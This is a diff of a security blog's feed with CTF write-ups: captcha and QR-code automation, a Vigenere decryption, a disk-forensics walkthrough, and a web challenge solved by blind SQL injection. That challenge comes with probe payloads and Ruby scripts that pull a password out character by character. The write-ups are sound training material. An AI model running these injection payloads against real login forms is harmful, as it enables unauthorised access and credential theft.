class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">qrcode_answer = ZXing.decode qrcode_file</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line">c.http_post(Curl::PostField.content(<span class="string">'captcha'</span>, captcha_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'qrcode'</span>, qrcode_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">c.perform</div><div class="line">puts c.body_str.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line">puts <span class="string">"Flag : "</span> + captcha_answer + qrcode_answer</div><div class="line"></div><div class="line"><span class="comment">### Wait for avoiding Jruby to crash ###</span></div><div class="line">sleep(<span class="number">0</span>.<span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="comment">### Remove temporary file ###</span></div><div class="line">File.delete(qrcode_file)</div><div class="line">File.delete(captcha_file)</div><div class="line">File.delete(<span class="string">"output.gif"</span>)</div></pre></td></tr></table></figure>
-<p>Script is working but <code>curb</code> is not very quick and the <code>ZXing</code> ruby gem is just a port of the java version of <code>ZXing</code> with Jruby and is amazingly slow and buggy! So the whole script process take 9 seconds. That’s too slow!</p>
-<p>Let’s try to optimize the execution speed with more quicker tools:</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
+<p>With some frequency analysis and bruteforce we found:</p>
 <ul>
-<li>replace <code>curb</code> gem using libcurb directly with <code>curl</code></li>
-<li>replace <code>ZXing</code> with a custom script using <code>PIl</code> and <code>pytesseract</code></li>
+<li>The key was: <code>contest</code>.</li>
+<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
+<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
 </ul>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span> <span class="comment"># to decode base64 images</span></div><div class="line"></div><div class="line"><span class="comment">### Crawling the website to get the base64 QRCode ###</span></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/divers200'</span></div><div class="line"></div><div class="line">cookies = <span class="string">'session=mySessionCookie'</span></div><div class="line">body_str = <span class="string">`curl https://challenge-ecw.fr/chals/divers200 --cookie '<span class="subst">#&#123;cookies&#125;</span>'`</span></div><div class="line"></div><div class="line"><span class="comment">### Parse the output ###</span></div><div class="line">qrcode_b64 = body_str.match(<span class="regexp">/QRCode" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = body_str.match(<span class="regexp">/Captcha" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : base64 to png ###</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Captcha : base64 to png ###</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : png to text string ###</span></div><div class="line">qrcode_answer = <span class="string">`python2 myQRCodeSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line"></div><div class="line"><span class="comment">### Captcha : png to text string ###</span></div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Send the answer ###</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line">server_answer = <span class="string">`curl https://challenge-ecw.fr/chals/divers200 --cookie '<span class="subst">#&#123;cookies&#125;</span>' -X POST -F "captcha=<span class="subst">#&#123;captcha_answer&#125;</span>" -F "qrcode=<span class="subst">#&#123;qrcode_answer&#125;</span>" -F "nonce=<span class="subst">#&#123;nonce&#125;</span>"`</span></div><div class="line">puts <span class="string">'&gt;&gt;&gt; '</span> + server_answer.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="comment"># Redo the whole process one more time</span></div><div class="line">qrcode_b64 = server_answer.match(<span class="regexp">/QRCode Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = server_answer.match(<span class="regexp">/Captcha Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">qrcode_answer = <span class="string">`python2 myQRCodeSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line">puts <span class="string">"Flag : "</span> + captcha_answer + qrcode_answer</div><div class="line"></div><div class="line"><span class="comment">### Remove temporary file ###</span></div><div class="line">File.delete(qrcode_file)</div><div class="line">File.delete(captcha_file)</div><div class="line">File.delete(<span class="string">"output.gif"</span>)</div></pre></td></tr></table></figure>
-<p>Here is my custom captcha solver <code>myCaptchaSolver.py</code>:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> pytesseract <span class="keyword">import</span> image_to_string</div><div class="line"></div><div class="line">im = Image.open(<span class="string">"captcha.png"</span>)</div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line">im2 = Image.new(<span class="string">"P"</span>,im.size,<span class="number">255</span>)</div><div class="line"></div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line"></div><div class="line">temp = &#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(im.size[<span class="number">1</span>]):</div><div class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> range(im.size[<span class="number">0</span>]):</div><div class="line">    pix = im.getpixel((y,x))</div><div class="line">    temp[pix] = pix</div><div class="line">    <span class="keyword">if</span> pix == <span class="number">1</span>: <span class="comment"># these are the numbers to get</span></div><div class="line">      im2.putpixel((y,x),<span class="number">0</span>)</div><div class="line"></div><div class="line">im2.save(<span class="string">"output.gif"</span>)</div><div class="line"></div><div class="line"></div><div class="line">im2.load()</div><div class="line"><span class="keyword">print</span> (image_to_string(im2))</div></pre></td></tr></table></figure>
-<p>Here is my custom QR code solver <code>myQRCodeSolver.py</code>:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> qrtools</div><div class="line">qr = qrtools.QR()</div><div class="line">qr.decode(<span class="string">"qrcode.png"</span>)</div><div class="line"><span class="keyword">print</span> qr.data</div></pre></td></tr></table></figure>
-<p>Flag: <code>ECW{20cbf8e17eb7e62936e3602b498776e6}</code>.</p>
 ]]></content>
     
     <summary type="html">
@@ -1047,20 +1037,20 @@
     
       <category term="security" scheme="http://rawsec.ml/tags/security/"/>
     
+      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
+    
       <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
     
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
-      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
-    
   </entry>
   
   <entry>
-    <title>Hack The Vote 2016 - 50 - TOPKEK - Misc</title>
-    <link href="http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/"/>
-    <id>http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/</id>
-    <published>2016-11-04T23:00:00.000Z</published>
-    <updated>2016-11-05T17:33:07.876Z</updated>
+    <title>ECW - 50 - Authentification - Web</title>
+    <link href="http://rawsec.ml/en/ECW-2016-authentification/"/>
+    <id>http://rawsec.ml/en/ECW-2016-authentification/</id>
+    <published>2016-11-05T23:00:00.000Z</published>
+    <updated>2016-11-07T21:45:01.537Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -1079,32 +1069,103 @@
 </tbody>
 </table>
 <h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : Hack The Vote 2016</li>
-<li><strong>Website</strong> : <a href="https://pwn.voting/" target="_blank" rel="external">https://pwn.voting/</a></li>
+<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
+<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
 <li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/345" target="_blank" rel="external">link</a></li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
-<p>A CNN reporter had only one question that she couldn’t get off her mind</p>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="external">bling SQL injection</a> and Out-Of-Band (OOB) channel exfiltration is not working.<br>When giving a correct (well formed) SQLi we get the message: <code>Authentification valide. Le mot de passe est le flag.</code>.<br>So we are able to determine if a request is true or false.<br>So the following requests gave us some details about the DB:</p>
+<ul>
+<li><code>&#39; or 1=1 #</code> =&gt; MySQL Database</li>
+<li><code>&#39; or substring(version(),1,1)=5 #</code> =&gt; MySQL 5</li>
+<li><code>&#39; or (select 1)=1 #</code> =&gt; subselect supported</li>
+<li><code>&#39; or (select substring(concat(1,password),1,1) limit 0,1)=1 #</code> =&gt; column name is <em>password</em></li>
+</ul>
+<p>So our payload will be <code>SELECT password</code>.</p>
+<p>And here is the script I wrote :</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line"><span class="comment"># Find the length of the password</span></div><div class="line">length = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></div><div class="line">  c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR LENGTH((<span class="subst">#&#123;payload&#125;</span>))=<span class="subst">#&#123;length&#125;</span> #"</span>),</div><div class="line">              Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">  c.perform</div><div class="line">  <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">    puts <span class="string">"Length: <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    <span class="keyword">break</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    puts <span class="string">"Length: not <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    length+=<span class="number">1</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  (<span class="number">32</span>..<span class="number">126</span>).each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char.chr)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char.chr&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<p>We can optimize the time to get the password because we know that the flag is <code>ECW{md5(string)}</code> and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters:</p>
+<ul>
+<li>Lenght of the password: <strong>37</strong></li>
+<li>Alphabet: <strong>[“a”, “b”, “c”, “d”, “e”, “f”, “0”, “1”, “2”, “3”, “4”, “5”, “6”, “7”, “8”, “9”, “E”, “C”, “W”, “{“, “}”]</strong></li>
+</ul>
+<p>That give us the more optimized script:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line">length = <span class="number">37</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a + [<span class="string">'E'</span>, <span class="string">'C'</span>, <span class="string">'W'</span>, <span class="string">'&#123;'</span>, <span class="string">'&#125;'</span>]</div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char.ord&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<p>So we got the flag: <code>ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}</code>.</p>
+<p><strong>BONUS</strong>: I used my script to get the username:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT user()</div><div class="line">User: ecw@localhost</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
+    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
+    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
+    <published>2016-11-05T23:00:00.000Z</published>
+    <updated>2016-11-07T21:44:43.303Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
+<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
+<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
+<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
+<p>Its content is:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
+<p>So we need to find Windows registry and browse it.</p>
 <blockquote>
-<p>   Do we even know, who is this 4 CHAN???</p>
+<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
 </blockquote>
-<p>So she set out to find who this 400lb hacker is. During her investigation, she came across this cryptic message on some politically incorrect forum online, can you figure out what it means?</p>
-<p><a href="https://s3.amazonaws.com/hackthevote/kek.43319559636b94db1c945834340b65d68f90b6ecbb70925f7b24f6efc5c2524e.txt" target="_blank" rel="external">kek</a></p>
-<p>author’s irc nick: krx</p>
-</blockquote>
-<p><strong>Note</strong>: This challenge was classified as <em>Crypto</em> but is <em>Misc</em>.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The content of the file looks like this:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP!! KEK!!! TOP!! KEK!!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP!!!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!!!! TOP!! KEK!!!!! TOP!!</div><div class="line">[...]</div></pre></td></tr></table></figure>
-<p>This looks like an esoteric language (like Ook) but it’s not.</p>
-<p><strong>N.B.:</strong> According to <a href="http://fr.urbandictionary.com/define.php?term=topkek" target="_blank" rel="external">1</a>, <a href="https://encyclopediadramatica.se/Topkek" target="_blank" rel="external">2</a> and <a href="http://knowyourmeme.com/memes/topkek" target="_blank" rel="external">3</a>, <em>kek</em> is derivated of <em>lel</em> that is a derivated of <em>lol</em>, and <em>topkek</em> is a cake trademark popular on <code>/s4s</code> chan of 4Chan because of its similarity with <em>toplel</em> which means <em>super funny</em>. (Knowing that is useless for the challenge).</p>
-<p>There is only two keyword <code>TOP</code> and <code>KEK</code> and they seem pretty useless. So let’s assume that it is binary: (<code>TOP</code> = 0 &amp;&amp; <code>KEK</code> = 1) or (<code>TOP</code> = 1 &amp;&amp; <code>KEK</code> = 0).</p>
-<p>We noticed there is between 1 and 5 exclamation marks following each keywords so let’s assume that is the number of times that 0 or 1 is repeated.</p>
-<p>Here is my script:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="comment"># read the file</span></div><div class="line">file = File.open(<span class="string">'kek.txt'</span>, <span class="string">'r+t'</span>)</div><div class="line">data = file.read</div><div class="line">file.close</div><div class="line">puts <span class="string">"Original: \n"</span> + data + <span class="string">"\n\n"</span></div><div class="line"></div><div class="line"><span class="comment"># Assume that TOP = 1, KEK = 0, and ! the number of time they appear</span></div><div class="line">topkek_to_binary = <span class="string">""</span></div><div class="line">data.split(<span class="string">" "</span>).each <span class="keyword">do</span> <span class="params">|bool|</span></div><div class="line">  <span class="keyword">if</span> bool.match(<span class="regexp">/TOP/</span>)</div><div class="line">    marks = bool.sub(<span class="string">'TOP'</span>, <span class="string">''</span>) <span class="comment"># keeping only the marks</span></div><div class="line">    bin = marks.gsub(<span class="string">'!'</span>, <span class="string">'1'</span>) <span class="comment"># replacing 